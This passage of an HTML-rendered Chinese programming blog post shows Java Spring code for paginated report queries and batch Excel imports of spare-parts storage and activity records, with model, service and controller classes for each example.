class="line">            exampleDetail.createCriteria().andEqualTo(<span class="string">&quot;reportId&quot;</span>, dataList.get(i).getReportId());</span><br><span class="line">            List&lt;TCustomReportDetail&gt; tCustomReportDetails = tCustomReportDetailMapper.selectByExample(exampleDetail);</span><br><span class="line">            <span class="keyword">if</span> (tCustomReportDetails != <span class="keyword">null</span> &amp;&amp; tCustomReportFindByIdBody.get(i)!=<span class="keyword">null</span>) &#123;</span><br><span class="line">              tCustomReportFindByIdBody.get(i).setTCustomReportDetail(tCustomReportDetails);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    PageInfo&lt;TCustomReportFindByIdBody&gt; pageInfo = <span class="keyword">new</span> PageInfo&lt;&gt;(tCustomReportFindByIdBody);</span><br><span class="line">    pageInfo.setTotal(pageInfoTCustomReport.getTotal());</span><br><span class="line">    pageInfo.setPages(pageInfoTCustomReport.getPages());</span><br><span class="line">    <span class="keyword">return</span> pageInfo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>❤❤注意tCustomReportFindByIdBody.set(i,new TCustomReportFindByIdBody());</p><hr><h1 id="批量导入"><a href="#批量导入" class="headerlink" title="批量导入"></a>批量导入</h1><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><h3 id="Model类-1"><a href="#Model类-1" class="headerlink" title="Model类"></a>Model类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.psds.credit.model.device.parts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.psds.credit.common.annotation.Excel;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 批量入库模板类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> ChenZhiMing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2021年11月18日, 0018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeviceImportStorage</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">72977236488394554L</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 备件名称</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Excel(name=&quot;备件名称&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String partsInfoName;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 入库单号</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Excel(name=&quot;采购单号&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String storageNum;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 仓库名称</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Excel(name=&quot;入库仓库&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String storageWarehouse;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 入库数量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Excel(name=&quot;入库数量&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Integer storageCount;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Service类-1"><a href="#Service类-1" class="headerlink" title="Service类"></a>Service类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 批量导入入库信息</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> partsList: 备件数据列表</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">importPartsStorage</span><span class="params">(List&lt;DeviceImportStorage&gt; partsList,  String sysUser)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (com.psds.credit.common.utils.StringUtils.isNull(partsList) || partsList.size() == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> ServiceException(<span class="string">&quot;导入入库数据不能为空！&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">int</span> successNum = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">int</span> failureNum = <span class="number">0</span>;</span><br><span class="line">       StringBuilder successMsg = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">       StringBuilder failureMsg = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">       <span class="keyword">for</span> (DeviceImportStorage parts : partsList) &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               DevicePartsStorage partsStorage=<span class="keyword">new</span> DevicePartsStorage();</span><br><span class="line">               partsStorage.setStorageWarehouse(parts.getStorageWarehouse());</span><br><span class="line">               partsStorage.setStorageNum(parts.getStorageNum());</span><br><span class="line">               partsStorage.setStorageCount(parts.getStorageCount());</span><br><span class="line">               partsStorage.setCreateBy(sysUser);</span><br><span class="line">               partsStorage.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">               Example example = <span class="keyword">new</span> Example(DeviceParts.class);</span><br><span class="line">               example.createCriteria().andEqualTo(<span class="string">&quot;partsInfoName&quot;</span>,parts.getPartsInfoName());</span><br><span class="line">               List&lt;DeviceParts&gt; pageInfoList=devicePartsMapper.selectByExample(example);</span><br><span class="line">               partsStorage.setPartsInfoId(pageInfoList.get(<span class="number">0</span>).getPartsInfoId());</span><br><span class="line">               devicePartsStorageMapper.insertSelective(partsStorage);</span><br><span class="line">               successNum++;</span><br><span class="line">               successMsg.append(<span class="string">&quot;&lt;br/&gt;&quot;</span> + successNum + <span class="string">&quot;、入库信息 &quot;</span> + parts.getPartsInfoName() + <span class="string">&quot; 导入成功&quot;</span>);</span><br><span class="line">               <span class="comment">//更新仓库备件计数表对应的备件数量</span></span><br><span class="line">               <span class="comment">//1判断对应的id和仓库是否存在</span></span><br><span class="line">               Example example3 = <span class="keyword">new</span> Example(DevicePartsCount.class);</span><br><span class="line">               Example.Criteria criteria3 = example3.createCriteria();</span><br><span class="line">               <span class="keyword">if</span> (StringUtils.isNotBlank(partsStorage.getPartsInfoId().toString())) &#123;</span><br><span class="line">                   criteria3.andEqualTo(<span class="string">&quot;countWarehouse&quot;</span>, parts.getStorageWarehouse());</span><br><span class="line">                   criteria3.andEqualTo(<span class="string">&quot;partsInfoId&quot;</span>, partsStorage.getPartsInfoId());</span><br><span class="line">               &#125;</span><br><span class="line">               List&lt;DevicePartsCount&gt; i = devicePartsCountMapper.selectByExample(example3);</span><br><span class="line">               <span class="keyword">if</span> (i.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                   <span class="comment">//是，修改数量</span></span><br><span class="line">                   <span class="keyword">int</span> count2 = i.get(<span class="number">0</span>).getCountSum();</span><br><span class="line">                   Example example4 = <span class="keyword">new</span> Example(DevicePartsCount.class);</span><br><span class="line">                   Example.Criteria criteria2 = example4.createCriteria();</span><br><span class="line">                   criteria2.andEqualTo(<span class="string">&quot;countWarehouse&quot;</span>, parts.getStorageWarehouse());</span><br><span class="line">                   criteria2.andEqualTo(<span class="string">&quot;partsInfoId&quot;</span>, partsStorage.getPartsInfoId());</span><br><span class="line">                   DevicePartsCount dc = <span class="keyword">new</span> DevicePartsCount();</span><br><span class="line">                   dc.setCountSum(count2 + parts.getStorageCount());</span><br><span class="line">                   devicePartsCountMapper.updateByExampleSelective(dc, example4);</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="comment">//否，插入数据</span></span><br><span class="line">                   DevicePartsCount dc = <span class="keyword">new</span> DevicePartsCount();</span><br><span class="line">                   dc.setCountSum(parts.getStorageCount());</span><br><span class="line">                   dc.setCountWarehouse(parts.getStorageWarehouse());</span><br><span class="line">                   dc.setPartsInfoId(partsStorage.getPartsInfoId());</span><br><span class="line">                   devicePartsCountMapper.insertSelective(dc);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">//修改总库存</span></span><br><span class="line">               <span class="comment">//查询仓库配置表对应仓库备件数量</span></span><br><span class="line">               Example configCountE = <span class="keyword">new</span> Example(DevicePartsWarehouseConfig.class);</span><br><span class="line">               <span class="keyword">if</span> (StringUtils.isNotBlank(parts.getStorageWarehouse())) &#123;</span><br><span class="line">                   configCountE.createCriteria().andEqualTo(<span class="string">&quot;warehouseConfigName&quot;</span>, parts.getStorageWarehouse());</span><br><span class="line">               &#125;</span><br><span class="line">               List&lt;DevicePartsWarehouseConfig&gt; s = warehouseConfigMapper.selectByExample(configCountE);</span><br><span class="line">               <span class="keyword">int</span> sum = s.get(<span class="number">0</span>).getWarehouseConfigNum();</span><br><span class="line">               DevicePartsWarehouseConfig warehouseConfig = <span class="keyword">new</span> DevicePartsWarehouseConfig();</span><br><span class="line">               warehouseConfig.setWarehouseConfigNum(sum + parts.getStorageCount());</span><br><span class="line">               Example configExample = <span class="keyword">new</span> Example(DevicePartsWarehouseConfig.class);</span><br><span class="line">               configExample.createCriteria().andEqualTo(<span class="string">&quot;warehouseConfigName&quot;</span>, parts.getStorageWarehouse());</span><br><span class="line">               warehouseConfigMapper.updateByExampleSelective(warehouseConfig, configExample);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">               failureNum++;</span><br><span class="line">               String msg = <span class="string">&quot;&lt;br/&gt;&quot;</span> + failureNum + <span class="string">&quot;、入库信息 &quot;</span> + parts.getPartsInfoName() + <span class="string">&quot; 导入失败：&quot;</span>;</span><br><span class="line">               failureMsg.append(msg + e.getMessage());</span><br><span class="line">               log.error(msg, e);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (failureNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">           failureMsg.insert(<span class="number">0</span>, <span class="string">&quot;很抱歉，导入失败！共 &quot;</span> + failureNum + <span class="string">&quot; 条数据格式不正确，错误如下：&quot;</span>);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> ServiceException(failureMsg.toString());</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           successMsg.insert(<span class="number">0</span>, <span class="string">&quot;恭喜您，数据已全部导入成功！共 &quot;</span> + successNum + <span class="string">&quot; 条，数据如下：&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> successMsg.toString();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="Controller类-1"><a href="#Controller类-1" class="headerlink" title="Controller类"></a>Controller类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    *  批量导入入库信息</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> file: 文件</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@ApiOperation(value = &quot;批量导入入库信息&quot;,notes = &quot;&quot;)</span></span><br><span class="line">   <span class="meta">@PostMapping(&quot;/importPartsStorage&quot;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> AjaxResult <span class="title">importPartsStorage</span><span class="params">(<span class="meta">@RequestPart(&quot;file&quot;)</span> MultipartFile file)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       ExcelUtil&lt;DeviceImportStorage&gt; util = <span class="keyword">new</span> ExcelUtil&lt;DeviceImportStorage&gt;(DeviceImportStorage.class);</span><br><span class="line">       List&lt;DeviceImportStorage&gt; partsList = util.importExcel(file.getInputStream());</span><br><span class="line">       String sysUser = getUsername();</span><br><span class="line">       String message = devicePartsStorageService.importPartsStorage(partsList, sysUser);</span><br><span class="line">       <span class="keyword">return</span> AjaxResult.success(message);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *  导出备件入库模板</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> :</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@GetMapping(&quot;/importStorageTemplate&quot;)</span></span><br><span class="line">   <span class="meta">@ApiOperation(value = &quot;导出备件入库模板&quot;, notes = &quot;导出备件入库批量导入的Excel模板&quot;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> AjaxResult <span class="title">importTemplate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       ExcelUtil&lt;DeviceImportStorage&gt; util = <span class="keyword">new</span> ExcelUtil&lt;DeviceImportStorage&gt;(DeviceImportStorage.class);</span><br><span class="line">       <span class="keyword">return</span> util.importTemplateExcel(<span class="string">&quot;备件入库数据&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="Excel转换"><a href="#Excel转换" class="headerlink" title="Excel转换"></a>Excel转换</h3><p><img src="/images/pasted-1.png" alt="upload successful"></p><p><img src="/images/pasted-2.png" alt="upload successful"></p><h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><h3 id="Model类-2"><a href="#Model类-2" class="headerlink" title="Model类"></a>Model类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.psds.credit.model.xygl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonFormat;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.common.annotation.Excel;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModel;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModelProperty;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.Column;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> ChenZhiMing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2022年3月4日, 0004</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@ApiModel(&quot;活动导入模板类&quot;)</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ImportActivityReq</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3253903642039788589L</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;信易行活动名称&quot;)</span></span><br><span class="line">    <span class="meta">@Excel(name = &quot;活动名称&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String activityName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;信易行活动举办单位&quot;)</span></span><br><span class="line">    <span class="meta">@Excel(name = &quot;活动举办单位&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String activityHost;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;信易行活动开始时间&quot;)</span></span><br><span class="line">    <span class="meta">@Excel(name = &quot;活动开始时间&quot;)</span></span><br><span class="line">    <span class="meta">@JsonFormat(pattern = &quot;yyyy-MM-dd&quot;,timezone = &quot;GMT+8&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date activityStartTime;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;信易行活动结束时间&quot;)</span></span><br><span class="line">    <span class="meta">@Excel(name = &quot;活动结束时间&quot;)</span></span><br><span class="line">    <span class="meta">@JsonFormat(pattern = &quot;yyyy-MM-dd&quot;,timezone = &quot;GMT+8&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date activityEndTime;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;信易行活动描述&quot;)</span></span><br><span class="line">    <span class="meta">@Excel(name = &quot;活动描述&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String activityDescribe;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="meta">@Excel(name = &quot;活动状态(0:启用，1:禁用)&quot;)</span></span><br><span class="line">    <span class="meta">@ApiModelProperty(value=&quot;活动状态(0:启用，1:禁用)&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String activityState;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Service类-2"><a href="#Service类-2" class="headerlink" title="Service类"></a>Service类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 批量导入</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> is:</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> userId:</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> username:</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> Boolean <span class="title">importExcel</span><span class="params">(InputStream is, Integer userId, String username)</span> </span>&#123;</span><br><span class="line">       ExcelUtil&lt;ImportActivityReq&gt; excelUtil = <span class="keyword">new</span> ExcelUtil&lt;&gt;(ImportActivityReq.class);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           List&lt;ImportActivityReq&gt; xingActivitys = excelUtil.importExcel(is);</span><br><span class="line">           <span class="keyword">if</span> (xingActivitys == <span class="keyword">null</span> || xingActivitys.size() == <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> ServiceException(<span class="string">&quot;excel文件内容为空&quot;</span>, <span class="number">206</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           xingActivitys.forEach(x -&gt; &#123;</span><br><span class="line">               XINGActivity xingActivity = <span class="keyword">new</span> XINGActivity();</span><br><span class="line">               xingActivity.setXingActivityName(x.getActivityName());</span><br><span class="line">               xingActivity.setXingActivityHost(x.getActivityHost());</span><br><span class="line">               xingActivity.setXingActivityState(x.getActivityState());</span><br><span class="line">               xingActivity.setXingActivityStartTime(x.getActivityStartTime());</span><br><span class="line">               xingActivity.setXingActivityEndTime(x.getActivityEndTime());</span><br><span class="line">               xingActivity.setXingActivityDescribe(x.getActivityDescribe());</span><br><span class="line">               xingActivity.setDelFlag(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">               xingActivity.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">               xingActivity.setCreateUserId(userId);</span><br><span class="line">               xingActivity.setCreateUserName(username);</span><br><span class="line">               xingActivityMapper.insertSelective(xingActivity);</span><br><span class="line">           &#125;);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> ServiceException(<span class="string">&quot;文件导入失败或者excel文件内容不能为空&quot;</span>, <span class="number">206</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    *  批量导入</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> file: </span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@ApiOperation(&quot;导入活动信息&quot;)</span></span><br><span class="line">   <span class="meta">@PostMapping(&quot;importExcel&quot;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> ResultData&lt;Boolean&gt; <span class="title">importExcel</span><span class="params">(<span class="meta">@RequestPart(&quot;file&quot;)</span>MultipartFile file)</span></span>&#123;</span><br><span class="line">       InputStream inputStream;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           inputStream = file.getInputStream();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> ServiceException(<span class="string">&quot;上传文件异常！&quot;</span>, HttpStatus.NO_CONTENT);</span><br><span class="line">       &#125;</span><br><span class="line">       Boolean aBoolean = xingActivityService.importExcel(inputStream,getUserId().intValue(),getUsername());</span><br><span class="line">       ResultData&lt;Boolean&gt; resultData = <span class="keyword">new</span> ResultData&lt;&gt;();</span><br><span class="line">       resultData.setData(aBoolean);</span><br><span class="line">       <span class="keyword">return</span> resultData;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h2><h3 id="Model类-3"><a href="#Model类-3" class="headerlink" title="Model类"></a>Model类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ApiModel(&quot;活动导入模板类&quot;)</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ImportActivityReq</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3253903642039788589L</span>;</span><br><span class="line">    <span 